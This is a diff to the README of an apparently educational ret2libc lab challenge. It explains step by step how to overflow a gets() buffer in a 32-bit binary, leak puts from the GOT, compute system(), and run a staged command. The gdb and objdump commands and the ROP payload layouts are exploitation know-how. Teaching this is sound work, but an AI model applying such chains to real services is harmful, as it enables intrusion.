@@ -3,75 +3,153 @@
 ## Overview
 **Vulnerability:** Stack buffer overflow via `gets()` in a 32-bit binary  
 **Goal:** Leak one libc address, compute `system()`, and use the overflow to run a command  
-**Style:** Same exploit class as the exam challenge, but with one extra leak step so you practice the full ret2libc workflow
+**Style:** Meant to be solved by hand in pwndbg first, then checked against `exploit.py`
 
 ---
 
-## What The Binary Gives You
+## What To Prove In The Debugger
 
-The challenge binary has:
+Before writing the exploit, prove these four things in pwndbg:
 
-- a 12-byte stack buffer
-- a `gets(buffer)` call with no bounds checking
+1. The overflow reaches saved `EIP` after 24 bytes.
+2. The binary has PLT stubs for `puts`, `gets`, and `exit`.
+3. The `puts` GOT slot resolves to a libc pointer at runtime.
+4. A second overflow can call `gets(staging)` and then `system(staging)`.
+
+That is the whole ret2libc workflow here: control the stack, leak libc, do the math, then return with a useful string already staged.
+
+---
+
+## Why This Challenge Is A Real Ret2Libc
+
+The binary gives you:
+
+- a 12-byte local buffer inside `service()`
+- an unbounded `gets(buffer)` read
 - a writable global buffer named `staging`
-- a helper `popret()` gadget to clean one stack slot between chained calls
+- a small `popret()` gadget to clean the stack between chained calls
 - imported PLT entries for `puts`, `gets`, and `exit`
-- no direct `system()` PLT entry, so you must compute `system()` inside libc
+- no imported `system()`, so you must compute it from libc
 
-That last point is the whole lesson: this is a real ret2libc exploit, not just a ret2plt shortcut.
-
----
-
-## Key Offsets And Symbols
-
-| Item | Value |
-|------|-------|
-| Buffer size | 12 bytes |
-| Offset to saved return address | 24 bytes |
-| `puts@plt` | resolved by `exploit.py` |
-| `gets@plt` | resolved by `exploit.py` |
-| `exit@plt` | resolved by `exploit.py` |
-| `puts@got` | resolved by `exploit.py` |
-| `popret` | resolved by `exploit.py` |
-| `service` | resolved by `exploit.py` |
-| `staging` | resolved by `exploit.py` |
+That last point matters. If `system()` were already imported, this would be a ret2plt shortcut. Here you must derive the libc base from a leak and then add the `system()` offset yourself.
 
 ---
 
-## How The Exploit Works
+## Step 0: Inspect The Binary
 
-The attack has two stages:
+Start pwndbg and check the binary properties first:
 
-1. Call `puts(puts@got)` to leak the runtime address of `puts` from libc.
-2. Compute `libc_base = leaked_puts - puts_offset`, then `system_addr = libc_base + system_offset`.
-3. Return to the vulnerable function, overflow it again, call `gets(staging)`, then call the computed `system_addr(staging)`.
-4. Send `cat flag.txt` or another command as the second line so `gets()` writes it into `staging`.
-
----
-
-## Why The Leak Works
-
-The GOT entry for `puts` holds the real libc address of `puts` after relocation.
-When `puts(puts@got)` runs, the program prints the raw bytes stored at that GOT entry.
-That gives you the actual libc pointer value in little-endian form.
-
-Once you know one libc function address, the rest is arithmetic:
-
-$$
-\text{libc\_base} = \text{leaked\_puts} - \text{puts\_offset}
-$$
-
-$$
-\text{system\_addr} = \text{libc\_base} + \text{system\_offset}
-$$
-
----
-
-## Payload Shapes
-
-### Stage 1: Leak `puts`
-
+```gdb
+gdb -q ./challenge
+pwndbg> checksec
+pwndbg> disas service
 ```
+
+What you are looking for:
+
+- `No PIE`, so the binary’s own addresses stay fixed
+- `No canary`, so the stack overflow is usable directly
+- `NX enabled`, so injected shellcode is not the plan
+- a `gets(buffer)` call in `service()`
+
+If you want to sanity-check the layout outside the debugger, the build command is:
+
+```bash
+gcc challenge.c -o challenge -fno-stack-protector -no-pie -m32
+```
+
+---
+
+## Step 1: Find The Offset By Hand
+
+You do not need the script to discover the offset. Use a cyclic pattern and let pwndbg tell you where `EIP` lands.
+
+```gdb
+pwndbg> cyclic 100
+pwndbg> run
+```
+
+When the program asks for input, paste the pattern that `cyclic` printed. After the crash:
+
+```gdb
+pwndbg> i r eip esp ebp
+pwndbg> cyclic -l $eip
+```
+
+The result should be 24 bytes. You can also reason it out from the source: 12 bytes for the buffer, 4 bytes for saved `EBP`, and 8 bytes of compiler padding/alignment gives 24 total bytes to reach saved `EIP`.
+
+This is the first thing to verify by hand because every later payload depends on it.
+
+---
+
+## Step 2: Find The Useful Addresses
+
+Now inspect the symbols the exploit needs:
+
+```gdb
+pwndbg> info functions service
+pwndbg> info address service
+pwndbg> info address popret
+```
+
+For PLT/GOT entries, `objdump` or `readelf` is the cleanest way to read the exact addresses:
+
+```bash
+objdump -d ./challenge | grep '<puts@plt>'
+objdump -R ./challenge | grep puts
+objdump -d ./challenge | grep '<gets@plt>'
+objdump -d ./challenge | grep '<exit@plt>'
+```
+
+What these mean:
+
+- `puts@plt` is the stub you jump to inside the binary
+- `puts@got` is the writable slot that eventually contains the real libc address
+- `gets@plt` is used to stage the command string
+- `exit@plt` lets the process terminate cleanly after `system()` returns
+
+---
+
+## Step 3: Understand The Leak
+
+The first stage is not magic. You are calling `puts(puts@got)`.
+
+`puts@got` does not hold the text `puts`; it holds the resolved runtime pointer to libc’s `puts` function. When `puts` prints that memory, you get the actual address back as bytes on stdout.
+
+In GDB, it helps to inspect the GOT entry before and after the first call:
+
+```gdb
+pwndbg> x/wx <puts_got_address>
+pwndbg> vmmap
+```
+
+The important idea is simple: one libc pointer is enough. Once you know the runtime address of `puts`, the rest is just subtraction and addition.
+
+$$
+libc\_base = leaked\_puts - puts\_offset
+$$
+
+$$
+system\_addr = libc\_base + system\_offset
+$$
+
+If you want the libc offsets by hand, get the libc path with `ldd ./challenge` and then query it with `nm -D`:
+
+```bash
+ldd ./challenge
+nm -D /lib32/libc.so.6 | grep ' puts$'
+nm -D /lib32/libc.so.6 | grep ' system$'
+```
+
+Use the libc that `ldd` shows on your machine, not a guessed one.
+
+---
+
+## Step 4: Build The First ROP Chain
+
+The first payload leaks libc and returns to `service()` so you can send another round of input:
+
+```text
 [24 bytes padding]
 [puts@plt]
 [popret]
@@ -79,11 +157,55 @@ $$
 [service]
 ```
 
-This calls `puts(puts@got)` and then returns to `service` so you get a second chance to send input.
+Why the stack looks like that:
 
-### Stage 2: Stage Command And Execute It
+- `puts@plt` becomes the new instruction pointer
+- the next dword is the return address for `puts`, which is `popret`
+- the next dword is the argument to `puts`, which is `puts@got`
+- the last dword is where execution should go after the leak, which is `service`
 
+The `popret` gadget is there because `puts` returns with a normal cdecl stack layout. The gadget discards the leftover stack word so execution can continue cleanly.
+
+If you want to watch it live, break after the `gets()` call in `service()`, then single-step until the return path runs:
+
+```gdb
+pwndbg> b service
+pwndbg> run
+pwndbg> ni
+pwndbg> ni
 ```
+
+After the leak prints, copy the first 4 bytes of the output and interpret them as a little-endian 32-bit address.
+
+---
+
+## Step 5: Compute `system()` By Hand
+
+Once you have the leaked `puts` address, compute the libc base and then `system()`.
+
+Example shape:
+
+$$
+leaked\_puts = 0xf7e12340
+$$
+
+$$
+libc\_base = 0xf7e12340 - puts\_offset
+$$
+
+$$
+system\_addr = libc\_base + system\_offset
+$$
+
+In practice, the exploit script does exactly this with the offsets from the same libc on your machine.
+
+---
+
+## Step 6: Stage The Command And Call `system()`
+
+The second payload uses `gets()` to place a command string into `staging`, then calls `system(staging)`:
+
+```text
 [24 bytes padding]
 [gets@plt]
 [popret]
@@ -93,11 +215,67 @@ This calls `puts(puts@got)` and then returns to `service` so you get a second ch
 [staging]
 ```
 
-After the ROP chain starts, the next line of input becomes the command string stored in `staging`.
+The logic is:
+
+- `gets(staging)` reads the next line of input into writable memory
+- `system(staging)` executes that string
+- `exit@plt` cleans up if `system()` returns
+
+When you send this stage manually, you must send the command string immediately after the ROP payload, on the next line. For example:
+
+```text
+[second-stage payload]\ncat flag.txt\n
+```
+
+That is why `exploit.py` writes the payload and then a second newline-delimited command.
+
+---
+
+## Step 7: Suggested Manual pwndbg Flow
+
+If you want the exact solve flow to practice by hand, use this order:
+
+1. `checksec` the binary.
+2. `disas service` and confirm the `gets(buffer)` call.
+3. Crash it with `cyclic` and recover the offset with `cyclic -l $eip`.
+4. Read `puts@plt`, `puts@got`, `gets@plt`, `exit@plt`, `service`, and `popret`.
+5. Send the first ROP chain and capture the leaked `puts` pointer.
+6. Compute `libc_base` and `system_addr` from your local libc.
+7. Send the second ROP chain, then the command string on the next line.
+
+If one of those steps fails, the usual mistake is either a bad libc offset or a payload order problem on the stack.
+
+---
+
+## Payload Shapes
+
+### Stage 1: Leak `puts`
+
+```text
+[24 bytes padding]
+[puts@plt]
+[popret]
+[puts@got]
+[service]
+```
+
+### Stage 2: Stage Command And Execute It
+
+```text
+[24 bytes padding]
+[gets@plt]
+[popret]
+[staging]
+[system_addr]
+[exit@plt]
+[staging]
+```
 
 ---
 
 ## Using The Script
+
+The script is just the automated version of the manual steps above.
 
 ### Compile The Binary
 
@@ -120,29 +298,16 @@ python3 exploit.py --command "ls -la"
 
 ---
 
-## Manual Reasoning Checklist
-
-If you want to solve it by hand, verify these steps in order:
-
-1. Confirm the overflow reaches the return address after 24 bytes.
-2. Confirm `puts@plt`, `puts@got`, `gets@plt`, and `exit@plt` exist in the binary.
-3. Leak `puts` from the GOT and compute the libc base.
-4. Resolve `system()` from that libc base.
-5. Re-enter the vulnerable function and run the second ROP chain.
-6. Send the command string as the next line so `gets()` writes it into `staging`.
-
----
-
 ## Common Mistakes
 
 - Forgetting that the first leak is a raw libc pointer, not a string.
 - Using the wrong libc offsets for the installed environment.
-- Skipping the stack-cleanup gadget between chained calls.
-- Forgetting that the command string must arrive after the second `gets()` begins.
+- Swapping the stack order for `puts@plt`, the return address, and the argument.
+- Forgetting that the second-stage command must be sent after `gets(staging)` starts.
 - Assuming the same addresses will work if the binary is rebuilt differently.
 
 ---
 
 ## One-Line Takeaway
 
-Ret2libc is just stack control plus libc math: leak one function pointer, compute the base, then call `system()` with a string you staged yourself.
+Ret2libc is stack control plus libc math: leak one function pointer, compute the base, then call `system()` with a string you staged yourself.
